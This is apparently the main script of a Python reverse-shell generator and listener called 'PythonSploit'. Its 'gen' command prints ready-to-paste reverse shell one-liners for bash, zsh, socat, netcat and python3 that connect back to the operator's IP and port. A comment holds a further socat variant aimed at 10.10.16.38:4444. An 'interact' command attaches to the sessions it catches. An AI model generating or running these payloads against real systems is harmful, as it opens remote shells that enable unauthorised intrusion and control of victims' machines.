#!/usr/bin/python3

from rich import print
from handler import Handler
import time


banner = """
[red bold]
    ____        __  __               _____       __      _ __ 
   / __ \\__  __/ /_/ /_  ____  ____ / ___/____  / /___  (_) /_
  / /_/ / / / / __/ __ \\/ __ \\/ __ \\\\__ \\/ __ \\/ / __ \\/ / __/
 / ____/ /_/ / /_/ / / / /_/ / / / /__/ / /_/ / / /_/ / / /_  
/_/    \\__, /\\__/_/ /_/\\____/_/ /_/____/ .___/_/\\____/_/\\__/  
      /____/                          /_/                     
[/red bold]
"""
print(banner)

handler = Handler()


def print_help(command):
	#print(command)
	if len(command) == 1:
		if command[0] == "help":
			print("List of commands:")
			print("help\t\t\t\t\tDisplay list of command")
			print("gen\t\t\t\t\tGenerate payload")
			print("exit\t\t\t\t\tExit the program")
			print("Type 'help \\[command]' to see options for each command.")

	else:
		if command[1] == "gen":
			print("Usage: gen \\[format]")
			print("Generates copy-pasteable payload for target. Available formats:")
			print("- bash\n- zsh\n- socat\n- nc\n- python3")

def gen_payload(command, ip):
	if command[1] == "bash":
		print(f"[green bold]/bin/sh -i >& /dev/tcp/{handler.local_ip}/{handler.port} 0>&1[/green bold]")
	if command[1] == "zsh":
		print(f"[green bold]zsh -c 'zmodload zsh/net/tcp && ztcp {handler.local_ip} {handler.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'[/green bold]")
	if command[1] == "socat":
		print(f"[green bold]socat TCP:{handler.local_ip}:{handler.port} EXEC:/bin/sh[/green bold]")
	if command[1] == "nc":
		print(f"[green bold]nc {handler.local_ip} {handler.port} -e /bin/sh[/green bold]")
	if command[1] == "python3":
		print(f"""[green bold]python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{handler.local_ip}",{handler.port}))[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'[/green bold]""")
	
	"""
	socat TCP:10.10.16.38:4444 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane gives connection but pretty
	"""

def list_interacts():
	print("Listing connection ids...")
	print(handler.list_conn_ids())

if __name__ == "__main__":
	time.sleep(0.1)
	local_ip = handler.get_primary_ip()
	print("Type 'help' for a list of commands. ")
	while True:
		try: 
			command = input("> ")
			# thanks stackoverflow
			command = [x.strip() for x in command.split(' ')]
			if len(command) == 1:
				if command[0] == "help":
					#print("Printing help:")
					print_help(command)
				elif command[0] == "gen":
					print_help(["help", "gen"])
				elif command[0] == "interact":
					list_interacts()
				elif command[0] == "exit":
					print("[red]Exiting program (user exit)...[/red]")
					exit()
			elif len(command) == 2:
				if command[0] == "help":
					print_help(command)
				if command[0] == "gen":
					gen_payload(command, local_ip)
				if command[0] == "interact":
					try:
						handler.interact(command[1])
					except:
						print("Please enter valid session ID")
		except KeyboardInterrupt:
			print("\n[red]Exiting program (keyboard interrupt)...[/red]")
			exit()
	
	
